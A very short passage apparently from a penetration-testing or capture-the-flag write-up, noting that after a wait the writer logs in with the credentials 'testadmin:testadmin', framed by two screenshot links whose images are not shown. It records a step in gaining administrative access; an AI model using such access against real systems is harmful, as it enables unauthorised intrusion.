![[Pasted image 20241211221426.png]]
after waiting a couple minutes we are able to login with `testadmin:testadmin`
![[Pasted image 20241211221501.png]]